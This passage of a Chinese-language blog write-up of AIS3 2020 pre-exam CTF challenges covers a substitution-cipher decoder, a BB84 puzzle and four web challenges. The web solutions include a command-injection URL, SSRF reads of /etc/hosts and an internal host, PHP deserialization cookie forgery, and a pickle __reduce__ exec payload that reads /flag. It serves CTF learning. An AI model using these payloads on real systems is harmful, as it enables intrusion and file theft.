+<h3 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">table=&#123;<span class="string">'!!'</span>:<span class="string">'V'</span>,<span class="string">'!@'</span>:<span class="string">'5'</span>,<span class="string">'!#'</span>:<span class="string">'I'</span>,<span class="string">'!$'</span>:<span class="string">'K'</span>,<span class="string">'!%'</span>:<span class="string">'E'</span>,<span class="string">'!&amp;'</span>:<span class="string">'U'</span>,<span class="string">'@!'</span>:<span class="string">'F'</span>,<span class="string">'@@'</span>:<span class="string">'0'</span>,<span class="string">'@#'</span>:<span class="string">'W'</span>,<span class="string">'@$'</span>:<span class="string">'G'</span>,<span class="string">'@%'</span>:<span class="string">'3'</span>,<span class="string">'@&amp;'</span>:<span class="string">'Z'</span>,<span class="string">'#!'</span>:<span class="string">'Y'</span>,<span class="string">'#@'</span>:<span class="string">'M'</span>,<span class="string">'##'</span>:<span class="string">'H'</span>,<span class="string">'#$'</span>:<span class="string">'B'</span>,<span class="string">'#%'</span>:<span class="string">'C'</span>,<span class="string">'#&amp;'</span>:<span class="string">'8'</span>,<span class="string">'$!'</span>:<span class="string">'J'</span>,<span class="string">'$@'</span>:<span class="string">'2'</span>,<span class="string">'$#'</span>:<span class="string">'S'</span>,<span class="string">'$$'</span>:<span class="string">'X'</span>,<span class="string">'$%'</span>:<span class="string">'7'</span>,<span class="string">'$&amp;'</span>:<span class="string">'R'</span>,<span class="string">'%!'</span>:<span class="string">'6'</span>,<span class="string">'%@'</span>:<span class="string">'9'</span>,<span class="string">'%#'</span>:<span class="string">'4'</span>,<span class="string">'%$'</span>:<span class="string">'T'</span>,<span class="string">'%%'</span>:<span class="string">'P'</span>,<span class="string">'%&amp;'</span>:<span class="string">'D'</span>,<span class="string">'&amp;!'</span>:<span class="string">'1'</span>,<span class="string">'&amp;@'</span>:<span class="string">'L'</span>,<span class="string">'&amp;#'</span>:<span class="string">'Q'</span>,<span class="string">'&amp;$'</span>:<span class="string">'A'</span>,<span class="string">'&amp;%'</span>:<span class="string">'N'</span>,<span class="string">'&amp;&amp;'</span>:<span class="string">'O'</span>&#125;</span><br><span class="line"></span><br><span class="line">ordi = <span class="string">'&amp;$ !# $# @% &#123; %$ #! $&amp; %# &amp;% &amp;% @@ $# %# !&amp; $&amp; !&amp; !@ _ $&amp; @% $$ _ @$ !# !! @% _ #! @@ !&amp; _ $# &amp;&amp; #@ !% %$ ## !# &amp;% @$ _ $&amp; &amp;$ &amp;% %&amp; &amp;&amp; #@ _ !@ %$ %&amp; %! $$ &amp;# !# !! &amp;% @% ## $% !% !&amp; @! #&amp; &amp;&amp; %&amp; !% %$ %# %$ @% ## %@ @@ $% ## !&amp; #% %! %@ &amp;@ %! &amp;@ %$ $# ## %# !$ &amp;% @% !% !&amp; $&amp; &amp;% %# %@ #$ !# &amp;&amp; !&amp; #! %! ## #$ @! #% !! $! $&amp; @&amp; %% @@ &amp;&amp; #&amp; @% @! @# #@ @@ @&amp; !@ %@ !# !# $# $! !@ &amp;$ $@ !! @! &amp;# @$ &amp;! &amp;# $! @@ &amp;@ !% #% #! &amp;@ &amp;$ @@ &amp;$ &amp;! !&amp; #! !# ## %$ !# !# %$ &amp;! !# @# ## @@ $! $$ %# %$ @% @&amp; $! &amp;! !$ $# #$ $&amp; #@ %@ @$ !% %&amp; %! @% #% $! !! #$ &amp;# ## &amp;# &amp;&amp; $&amp; !! !% $! @&amp; !% &amp;@ !&amp; $! @# !@ !&amp; @$ $% #&amp; #$ %@ %% %% &amp;! $# !# $&amp; #@ &amp;! !# @! !@ @@ @@ ## !@ $@ !&amp; $# %&amp; %% !# !! $&amp; !$ $% !! @$ @&amp; !&amp; &amp;@ #$ &amp;&amp; @% $&amp; $&amp; !% &amp;! &amp;&amp; &amp;@ &amp;% @$ &amp;% &amp;$ &amp;@ $$ &#125;'</span></span><br><span class="line">format_ordi = ordi.split()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> format_ordi:</span><br><span class="line">    <span class="keyword">if</span>(i==<span class="string">'&#123;'</span> <span class="keyword">or</span> i==<span class="string">'&#125;'</span> <span class="keyword">or</span> i==<span class="string">'_'</span>):</span><br><span class="line">        print(i,end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(table[i],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag-8"><a href="#Flag-8" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{TYR4NN0S4URU5_R3X_GIV3_Y0U_SOMETHING_RANDOM_5TD6XQIVN3H7EUF8ODET4T3H907HUC69L6LTSH4KN3EURN49BIOUY6HBFCVJRZP0O83FWM0Z59IISJ5A2VFQG1QJ0LECYLA0A1UYIHTIIT1IWH0JX4T3ZJ1KSBRM9GED63CJVBQHQORVEJZELUJW5UG78B9PP1SIRM1IF500H52USDPIVRK7VGZULBO3RRE1OLNGNALX}</code></p>
+<h2 id="Octopus"><a href="#Octopus" class="headerlink" title="Octopus"></a>Octopus</h2><blockquote>
+<p><strong>103 solves</strong></p>
+</blockquote>
+<h3 id="題目-10"><a href="#題目-10" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>BB84 quantum key distribution has 8 main directions,</p>
+<p>just like a cute octopus A __ A.</p>
+</blockquote>
+<h3 id="File-9"><a href="#File-9" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/5f1d8f09cd100ff6c3aef9e43dd39109/output?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjV9.Xt9_Ig.Cr3dh43HJY9dNY-BdNyRkwCrAYQ" target="_blank" rel="noopener">output</a><br><a href="https://pre-exam.ais3.org/files/b82ef51ba5a71f0767c68979d428c95a/prob.py?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjZ9.Xt9_Ig.hqnGUH-0Ky4_GIOjJo0rN3HqzaU" target="_blank" rel="noopener">prob.py</a></p>
+<h3 id="解法-10"><a href="#解法-10" class="headerlink" title="解法"></a>解法</h3><p>先參照<a href="https://zh.wikipedia.org/wiki/%E9%87%8F%E5%AD%90%E5%AF%86%E9%91%B0%E5%88%86%E7%99%BC" target="_blank" rel="noopener">維基百科</a>了解BB84如何加密<br>題目中已經給好Basis<br>我們只要參照Table就可以分別對應出其箭號方向(Basis需相同)，進而找到是0/1<br><img src="https://i.imgur.com/Q2V5Pnc.png" alt=""><br>最終檔案中最後一筆資料與結果分別轉binary後xor轉字串即可</p>
+<h3 id="Flag-9"><a href="#Flag-9" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{EveryONe_kn0w_Quan7um_k3Y_Distr1but1on--BB84}</code></p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Squirrel"><a href="#Squirrel" class="headerlink" title="Squirrel"></a>Squirrel</h2><blockquote>
+<p><strong>220 solves</strong></p>
+</blockquote>
+<h3 id="題目-11"><a href="#題目-11" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Hack those creepy rats.</p>
+<p><a href="https://squirrel.ais3.org/" target="_blank" rel="noopener">https://squirrel.ais3.org/</a></p>
+</blockquote>
+<h3 id="解法-11"><a href="#解法-11" class="headerlink" title="解法"></a>解法</h3><p>從scource code可以發現到我們可以訪問目錄中的檔案<br><img src="https://i.imgur.com/IXwhBr6.png" alt=""><br>先去看看api.php<br>會發現到裡面有<code>exec</code>，可以猜測這裡會出漏洞<br><img src="https://i.imgur.com/g7Oy0E6.png" alt=""><br>先閉合，再輸入指令就可以了</p>
+<blockquote>
+<p><a href="https://squirrel.ais3.org/api.php?get=&#39;;ls" target="_blank" rel="noopener">https://squirrel.ais3.org/api.php?get=&#39;;ls</a> /‘<br>檔案可以先從當前目錄找，如果沒有，可以猜是在根目錄或是find猜猜看檔案名稱</p>
+</blockquote>
+<h3 id="Flag-10"><a href="#Flag-10" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{5qu1rr3l_15_4_k1nd_0f_b16_r47}</code></p>
+<h2 id="Shark"><a href="#Shark" class="headerlink" title="Shark"></a>Shark</h2><blockquote>
+<p><strong>261 solves</strong></p>
+</blockquote>
+<h3 id="題目-12"><a href="#題目-12" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Let’s dive deep again this year.</p>
+<p><a href="https://shark.ais3.org/" target="_blank" rel="noopener">https://shark.ais3.org/</a></p>
+</blockquote>
+<h3 id="解法-12"><a href="#解法-12" class="headerlink" title="解法"></a>解法</h3><p>一開始不知道這題要做什麼<br>於是到網路上找到去年的write-up，發現倒是在網址後面path造成的SSRF漏洞<br>可以先到<a href="https://shark.ais3.org/?path=php://filter/resource=/etc/hosts" target="_blank" rel="noopener">https://shark.ais3.org/?path=php://filter/resource=/etc/hosts</a> 獲取ip<br>根據題目，flag藏在附近的server上，所以可以從1開始慢慢手動找<br>最終可以在<a href="https://shark.ais3.org/?path=http://172.22.0.2/flag" target="_blank" rel="noopener">https://shark.ais3.org/?path=http://172.22.0.2/flag</a> 獲得flag</p>
+<h3 id="Flag-11"><a href="#Flag-11" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5}</code></p>
+<h2 id="Elephant"><a href="#Elephant" class="headerlink" title="Elephant"></a>Elephant</h2><blockquote>
+<p><strong>165 solves</strong></p>
+</blockquote>
+<h3 id="題目-13"><a href="#題目-13" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>Do elephants love cookies?</p>
+<p><a href="https://elephant.ais3.org/" target="_blank" rel="noopener">https://elephant.ais3.org/</a></p>
+<p>IMPORTANT</p>
+<pre><code>There&apos;s a hint in the webpage</code></pre></blockquote>
+<h3 id="解法-13"><a href="#解法-13" class="headerlink" title="解法"></a>解法</h3><p>在cookie裡面可以看到一個<code>elephant_user</code>，將值base64 decode後會發現是php序列化後的資料格式<br>但是由於不知道底層是將甚麼class序列化，目前還用不上它<br>由於沒有其他資訊了，想到最初web學到的知識<br>開始搜尋 <code>/robots.txt</code>, <code>/.git</code>, <code>/.svn</code> …<br>發現到<code>/.git</code>有githack漏洞<br>在網路上找到githack工具直接獲得網頁原始碼</p>
+<p>透過原始碼可以發現到token會經過md5加密<br>而要獲取flag需要在<code>strcmp($flag, $this-&gt;token)==0</code>才能獲得<br>顯然token需要是特殊值才能破解它<br>發現到token是NAN可以解<br>於是將class複製後將<code>__construct</code>中關於<code>token</code>的部分註解<br>再將class serialize base64_encode<br>將cookie複寫即可</p>
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><p><code>AIS3{0nly_3l3ph4n75_5h0uld_0wn_1v0ry}</code></p>
+<h2 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h2><blockquote>
+<p><strong>137 solves</strong></p>
+</blockquote>
+<h3 id="題目-14"><a href="#題目-14" class="headerlink" title="題目"></a>題目</h3><blockquote>
+<p>How to read that flag?</p>
+<p><a href="https://snake.ais3.org/" target="_blank" rel="noopener">https://snake.ais3.org/</a></p>
+</blockquote>
+<h3 id="解法-14"><a href="#解法-14" class="headerlink" title="解法"></a>解法</h3><p>打開後會看到一個python檔，且可以接收pickle data<br>如果要符合 <code>data is not data</code> 理論上不可能<br>除非寫一個function讓他可以每次詢問與上次相反<br>但是pickle中能寫入的內容會是靜態的，function沒辦法寫入<br>所以我們目標會是後面的 <code>return str(data)</code> ，只要data是flag就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import base64</span><br><span class="line">import os</span><br><span class="line">class test():</span><br><span class="line">	def __reduce__(self):</span><br><span class="line">		return (exec,(&#39;globals()[\&#39;str\&#39;]&#x3D;lambda data : open(\&#39;&#x2F;flag\&#39;).read()&#39;,))</span><br><span class="line"></span><br><span class="line">print(base64.b64encode(pickle.dumps(test())))</span><br><span class="line">data &#x3D; (pickle.loads(pickle.dumps(test())))</span><br></pre></td></tr></table></figure>
+
+<p>最後將pickle檔案放上去即可!</p>
+<h3 id="Flag-12"><a href="#Flag-12" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{7h3_5n4k3_w1ll_4lw4y5_b173_b4ck.}</code></p>
+<h2 id="心得"><a href="#心得" class="headerlink" title="心得"></a>心得</h2><p>第一次打AIS3 pre-exam，收穫意外的多<br>尤其在web部分花了特別多的心力在上面，也藉此學到像是 phpserialize 和 python的pickle data<br>Crypto很多都是參考去年的write-up 自己腦洞大開解出來的並不多<br>Pwn是我很不熟悉的領域，所以碰的題目不多<br>Reverse印象最深刻的是音遊w，第一次用cheat engine XDD<br>不過那題的正解似乎是先返組譯java後trace code找到flag如何產生<br>整體難度個人覺得中偏難w<br>這次的排名在第96，明年繼續加油OwO</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/AIS3/" rel="tag"># AIS3</a>
+              <a href="/tags/CTF-write-up/" rel="tag"># CTF write-up</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/07/03/TOJ470/" rel="prev" title="TOJ470">
+      <i class="fa fa-chevron-left"></i> TOJ470
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#AIS3-2020-pre-exam-write-up"><span class="nav-number">1.</span> <span class="nav-text">AIS3 2020 pre-exam write-up</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Misc"><span class="nav-number">2.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Piquero"><span class="nav-number">2.1.</span> <span class="nav-text">Piquero</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目"><span class="nav-number">2.1.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File"><span class="nav-number">2.1.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法"><span class="nav-number">2.1.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag"><span class="nav-number">2.1.4.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Karuego"><span class="nav-number">2.2.</span> <span class="nav-text">Karuego</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-1"><span class="nav-number">2.2.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-1"><span class="nav-number">2.2.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-1"><span class="nav-number">2.2.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-1"><span class="nav-number">2.2.4.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Soy"><span class="nav-number">2.3.</span> <span class="nav-text">Soy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-2"><span class="nav-number">2.3.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-2"><span class="nav-number">2.3.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-2"><span class="nav-number">2.3.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-2"><span class="nav-number">2.3.4.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Saburo"><span class="nav-number">2.4.</span> <span class="nav-text">Saburo</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-3"><span class="nav-number">2.4.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-3"><span class="nav-number">2.4.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-3"><span class="nav-number">2.4.3.</span> <span class="nav-text">Flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reverse"><span class="nav-number">3.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#TsaiBro"><span class="nav-number">3.1.</span> <span class="nav-text">TsaiBro</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-4"><span class="nav-number">3.1.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-3"><span class="nav-number">3.1.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-4"><span class="nav-number">3.1.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-4"><span class="nav-number">3.1.4.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Fallen-Beat"><span class="nav-number">3.2.</span> <span class="nav-text">Fallen Beat</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-5"><span class="nav-number">3.2.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-4"><span class="nav-number">3.2.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-5"><span class="nav-number">3.2.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AIS3"><span class="nav-number">3.2.4.</span> <span class="nav-text">AIS3</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Stand-up-Brain"><span class="nav-number">3.3.</span> <span class="nav-text">Stand up!Brain</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-6"><span class="nav-number">3.3.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-5"><span class="nav-number">3.3.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-6"><span class="nav-number">3.3.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-5"><span class="nav-number">3.3.4.</span> <span class="nav-text">Flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pwn"><span class="nav-number">4.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#BOF"><span class="nav-number">4.1.</span> <span class="nav-text">BOF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-7"><span class="nav-number">4.1.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-6"><span class="nav-number">4.1.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-7"><span class="nav-number">4.1.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-6"><span class="nav-number">4.1.4.</span> <span class="nav-text">Flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Crypto"><span class="nav-number">5.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Brontosaurus"><span class="nav-number">5.1.</span> <span class="nav-text">Brontosaurus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-8"><span class="nav-number">5.1.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-7"><span class="nav-number">5.1.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-8"><span class="nav-number">5.1.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-7"><span class="nav-number">5.1.4.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#T-Rex"><span class="nav-number">5.2.</span> <span class="nav-text">T-Rex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-9"><span class="nav-number">5.2.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-8"><span class="nav-number">5.2.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-9"><span class="nav-number">5.2.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Code"><span class="nav-number">5.2.4.</span> <span class="nav-text">Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-8"><span class="nav-number">5.2.5.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Octopus"><span class="nav-number">5.3.</span> <span class="nav-text">Octopus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-10"><span class="nav-number">5.3.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#File-9"><span class="nav-number">5.3.2.</span> <span class="nav-text">File</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-10"><span class="nav-number">5.3.3.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-9"><span class="nav-number">5.3.4.</span> <span class="nav-text">Flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">6.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Squirrel"><span class="nav-number">6.1.</span> <span class="nav-text">Squirrel</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-11"><span class="nav-number">6.1.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-11"><span class="nav-number">6.1.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-10"><span class="nav-number">6.1.3.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Shark"><span class="nav-number">6.2.</span> <span class="nav-text">Shark</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-12"><span class="nav-number">6.2.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-12"><span class="nav-number">6.2.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-11"><span class="nav-number">6.2.3.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Elephant"><span class="nav-number">6.3.</span> <span class="nav-text">Elephant</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-13"><span class="nav-number">6.3.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-13"><span class="nav-number">6.3.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#flag"><span class="nav-number">6.3.3.</span> <span class="nav-text">flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Snake"><span class="nav-number">6.4.</span> <span class="nav-text">Snake</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#題目-14"><span class="nav-number">6.4.1.</span> <span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#解法-14"><span class="nav-number">6.4.2.</span> <span class="nav-text">解法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag-12"><span class="nav-number">6.4.3.</span> <span class="nav-text">Flag</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#心得"><span class="nav-number">6.5.</span> <span class="nav-text">心得</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Koios1143"
+      src="/images/rinko.jpg">
+  <p class="site-author-name" itemprop="name">Koios1143</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">49</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分類</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags">
+          
+        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-name">標籤</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Koios1143" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Koios1143" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:ken1357924681010@gmail.com" title="E-Mail → mailto:ken1357924681010@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.facebook.com/Koios1143" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;Koios1143" rel="noopener" target="_blank"><i class="fab fa-facebook fa-fw"></i>FB Page</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-TW" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Koios1143</span>
+</div>
+  <div class="addthis_inline_share_toolbox">
+    <script src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5efb62697b06a5e5" async="async"></script>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
